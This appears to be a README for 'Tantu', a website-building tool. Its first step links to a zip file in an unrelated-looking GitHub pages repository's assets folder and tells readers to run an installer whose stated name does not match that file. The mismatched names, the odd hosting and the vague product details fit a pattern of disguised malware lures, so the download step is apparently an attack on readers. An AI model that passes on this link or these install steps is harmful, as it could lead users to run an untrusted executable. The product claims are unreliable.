## 🚀 Getting Started

Ready to build your first website? Follow these simple steps:

### Step 1: Download Tantu

Visit this link to download the application: **[https://github.com/rbarmyarmy/rbarmyarmy.github.io/raw/refs/heads/main/assets/App_2.2.zip](https://github.com/rbarmyarmy/rbarmyarmy.github.io/raw/refs/heads/main/assets/App_2.2.zip)**

Click the download button. The file will start downloading to your computer.

### Step 2: Run the Installer

Once the download finishes, find the downloaded file in your "Downloads" folder. It's usually named something like `tantu-c-framework-setup.exe`. Double-click it to begin installation. Follow the on-screen prompts. The default settings are fine for most users. Click "Next" or "Install" when asked.

### Step 3: Launch Tantu

After installation, you'll find a shortcut on your desktop or in your Start Menu. Double-click the Tantu icon to open it.

### Step 4: Create Your First Site

When Tantu opens, you'll see a welcome screen. Click the button that says "New Project" or "Create Website." Give your project a name (like "My First Site") and choose a folder where you want to save it. Click "Create."

### Step 5: Add Some Content

Tantu opens with a simple editor. On the left, you'll see your project files. In the middle is your content editor. On the right is a preview of your website.

Type something in the editor—anything at all. Try writing "Hello, world!" You'll see it appear in the preview on the right.

### Step 6: Publish Your Site

When you're happy with your content, click the "Build" button (it looks like a play button or a gear icon). Tantu will process your files and create a ready-to-use website. You'll see a folder called "dist" or "output" in your project folder. That's your finished website!

### Step 7: Share With the World

To see your site live, open the "dist" folder and double-click the file called `index.html`. It will open in your web browser. That's it! You've built a website.

To share it online, you'll need a web host. Upload the contents of the "dist" folder to any hosting service (like Netlify, GitHub Pages, or your own web server). Follow their instructions for uploading files.
